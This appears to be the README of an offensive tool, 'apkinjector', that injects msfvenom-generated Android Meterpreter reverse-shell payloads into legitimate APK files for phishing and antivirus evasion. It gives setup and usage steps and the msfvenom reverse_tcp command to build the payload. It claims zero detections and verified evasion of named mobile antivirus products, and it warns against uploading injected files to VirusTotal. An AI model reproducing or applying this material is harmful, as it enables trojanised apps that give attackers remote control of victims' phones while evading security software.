# apkinjector
Android APK Antivirus evasion for msfvenom generated payloads to inject into another APK file for phishing attacks.
<br><br>
<b> -- Please do not upload "injected" files to VirusTotal.com -- </b><br>
<br>
<br>
<b>Still a work in progress. If having to manually locate the .smali file that is launched with the app, then you are looking for the MAIN and LAUNCHER calls and the .smali reference will be above it that you can use for manually pointing to it. Still working on automating it every time. If still having issues, then manually utilize APKTool on the .apk file to decomile, then recompile it. If it doesn't recompile, then the script will not work anyways. For debugging be sure to comment out the removal of the /tmp/original directory so you can review the files to see what happened. </b>
<br><br>
<b>Setup:</b><br>
chmod +x apkinjector<br>
mv apkinjector /usr/local/bin/.<br>
<br>
<b>On first run:</b><br>
-Downloads and places apktool.jar in the user's /usr/local/bin directory<br>
-Generates debug keystore for signing. Places it in ~/.android/<br>
<b>NOTE:</b> If wanting to customize each signature, then remove the keystore before running the script.<br>
<br>
<b>Usage:</b><br>
apkinjector \<payload>.apk \<original>.apk<br>
<br>
<b>Input:</b><br>
This script takes a msfgenerated payload as input along with an .apk you want to inject into.<br>
To generate the payload: msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT<PORT> -o \<payload>.apk<br>
<br>
<b>Output:</b><br>
injected_\<original>.apk<br>
<br>
<b>Antivirus detection:</b><br>
0/35 on nodistribute - 16Feb17<br>
Verified for AVG mobile<br>
Verified for Kaspersky mobile<br>
<br>
<br>
<b>Debugging</b><br>
Comment out the removal of the /tmp/payload and /tmp/original directories to see the file structure that was compiled.<br>
